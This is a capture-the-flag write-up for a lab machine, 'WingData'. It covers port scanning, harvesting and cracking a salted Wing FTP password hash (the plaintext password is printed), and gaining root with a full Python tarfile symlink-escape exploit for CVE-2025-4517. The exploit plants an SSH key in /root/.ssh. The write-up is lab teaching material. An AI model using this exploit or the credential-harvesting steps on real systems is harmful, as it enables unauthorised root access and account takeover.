# Initial Recon 

```nmap 
# Nmap 7.98 scan initiated Sat Feb 14 14:17:26 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC --min-rate=5000 -p- -oN nmap.txt 10.129.1.93
Nmap scan report for 10.129.1.93
Host is up (0.39s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 14 14:18:11 2026 -- 1 IP address (1 host up) scanned in 44.92 seconds
```

checking port 80 

<img src="assets/Pasted image 20260215160320.png">

subdomain on client protal 

``ftp.wingdata.htb`

<img src="assets/Pasted image 20260215160455.png">

searchploit revealed this 

<img src="assets/Pasted image 20260215160534.png">
<img src="assets/Pasted image 20260215160609.png">

flawless 

# Post Exploitation
getting the users 

```bash
wingftp@wingdata:/opt/wftpserver$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
wingftp@wingdata:/opt/wftpserver$ 
```

``wacky`` user , mmmm , more neumeration revealed the password 

```
wingftp@wingdata:/opt/wftpserver$ ls 
Data         Log  pid-wftpserver.pid  session        version.txt  webclient    wftp_default_ssh.key  wftp_default_ssl.key
License.txt  lua  README              session_admin  webadmin     wftpconsole  wftp_default_ssl.crt  wftpserver
wingftp@wingdata:/opt/wftpserver$ cd Data 
wingftp@wingdata:/opt/wftpserver/Data$ ls 
1  _ADMINISTRATOR  bookmark_db  settings.xml  ssh_host_ecdsa_key  ssh_host_key
wingftp@wingdata:/opt/wftpserver/Data$ cd 1 
wingftp@wingdata:/opt/wftpserver/Data/1$ ls 
groups  portlistener.xml  settings.xml  users
wingftp@wingdata:/opt/wftpserver/Data/1$ cd users/
wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls 
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml 
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762103089</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>2</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp>127.0.0.1</LastLoginIp>
        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
wingftp@wingdata:/opt/wftpserver/Data/1/users$ 
```

but it didnt crack . its a sha256 and it has a mode that work with salt , so either the password is uncrackable or we need salt 

with just a command we get the salt 

```bash 
wingftp@wingdata:/opt/wftpserver$ find . -name "*.xml" -exec grep -l "Salt" {} \;
./Data/1/settings.xml
wingftp@wingdata:/opt/wftpserver$ cat ./Data/1/settings.xml | grep Salt 
    <EnablePasswordSalting>1</EnablePasswordSalting>
    <SaltingString>WingFTP</SaltingString>
wingftp@wingdata:/opt/wftpserver$ 
```

ok now we crack it 

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

now we ssh to wacky 

<img src="assets/Pasted image 20260215162207.png">

# Priv Escalation 

linux_exploit_suggestor gave us multiple vernability on the system but none of them worked 
but winpeas found [https://web.archive.org/web/20250731135712/https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f](CVE-2025-4517)

and getting it to work was a hole lota a mess .. it took me a lot of time to get the exploit to work but .. to do this u need to understand how it work .. slamming it into llms gave absolutly nothing to work .. soo the idea was to understand the exploit how it work and with aid of llm u can generate a script that can actually execute an arbitrary Read/Write to the `/root/.ssh` and ssh to root 

but in my case i just read the root.txt 

the idea was to make compress a directory so depth that tarfile library cannot process it which lead the path to be ignored by the `filter=data` param on the script and linking the ``/root`` directory  

```bash
cd /tmp

# Generate SSH key
ssh-keygen -t rsa -f /tmp/rootkey -N ""

# Create the exploit tar
python3 << 'EXPLOIT'
import tarfile, os, io

# Read your actual public key
with open('/tmp/rootkey.pub', 'rb') as f:
    pubkey = f.read()

comp = 'd' * 247  # Component name close to PATH_MAX
steps = "abcdefghijklmnop"  # 16 levels deep
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    # Build realpath overflow symlink chain
    for i in steps:
        # Create directory
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        
        # Create symlink to that directory
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        
        path = os.path.join(path, comp)
    
    # Create overflow symlink that goes back up
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
    
    # Escape symlink to root
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../.."
    tar.addfile(e)
    
    # Create /root/.ssh directory
    ssh_dir = tarfile.TarInfo("escape/root/.ssh")
    ssh_dir.type = tarfile.DIRTYPE
    ssh_dir.mode = 0o700
    tar.addfile(ssh_dir)
    
    # Write authorized_keys
    auth_keys = tarfile.TarInfo("escape/root/.ssh/authorized_keys")
    auth_keys.type = tarfile.REGTYPE
    auth_keys.size = len(pubkey)
    auth_keys.mode = 0o600
    tar.addfile(auth_keys, fileobj=io.BytesIO(pubkey))

print("Exploit tar created!")
EXPLOIT

# Copy and extract
cp /tmp/backup_9999.tar /opt/backup_clients/backups/
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_final999

# SSH as root!
ssh -o StrictHostKeyChecking=no -i /tmp/rootkey root@127.0.0.1 'whoami && cat /root/root.txt'
```

<img src="assets/Pasted image 20260215163047.png">

and we done 